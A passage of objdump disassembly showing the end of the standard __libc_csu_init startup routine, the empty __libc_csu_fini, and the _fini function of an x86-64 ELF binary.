 e2b:	4c 8d 25 3e 0f 20 00 	lea    0x200f3e(%rip),%r12        # 201d70 <__frame_dummy_init_array_entry>
 e32:	55                   	push   %rbp
 e33:	48 8d 2d 3e 0f 20 00 	lea    0x200f3e(%rip),%rbp        # 201d78 <__init_array_end>
 e3a:	53                   	push   %rbx
 e3b:	41 89 fd             	mov    %edi,%r13d
 e3e:	49 89 f6             	mov    %rsi,%r14
 e41:	4c 29 e5             	sub    %r12,%rbp
 e44:	48 83 ec 08          	sub    $0x8,%rsp
 e48:	48 c1 fd 03          	sar    $0x3,%rbp
 e4c:	e8 cf f8 ff ff       	callq  720 <_init>
 e51:	48 85 ed             	test   %rbp,%rbp
 e54:	74 20                	je     e76 <__libc_csu_init+0x56>
 e56:	31 db                	xor    %ebx,%ebx
 e58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 e5f:	00 
 e60:	4c 89 fa             	mov    %r15,%rdx
 e63:	4c 89 f6             	mov    %r14,%rsi
 e66:	44 89 ef             	mov    %r13d,%edi
 e69:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 e6d:	48 83 c3 01          	add    $0x1,%rbx
 e71:	48 39 dd             	cmp    %rbx,%rbp
 e74:	75 ea                	jne    e60 <__libc_csu_init+0x40>
 e76:	48 83 c4 08          	add    $0x8,%rsp
 e7a:	5b                   	pop    %rbx
 e7b:	5d                   	pop    %rbp
 e7c:	41 5c                	pop    %r12
 e7e:	41 5d                	pop    %r13
 e80:	41 5e                	pop    %r14
 e82:	41 5f                	pop    %r15
 e84:	c3                   	retq   
 e85:	90                   	nop
 e86:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 e8d:	00 00 00 

0000000000000e90 <__libc_csu_fini>:
 e90:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000e94 <_fini>:
 e94:	48 83 ec 08          	sub    $0x8,%rsp
 e98:	48 83 c4 08          	add    $0x8,%rsp
 e9c:	c3                   	retq   
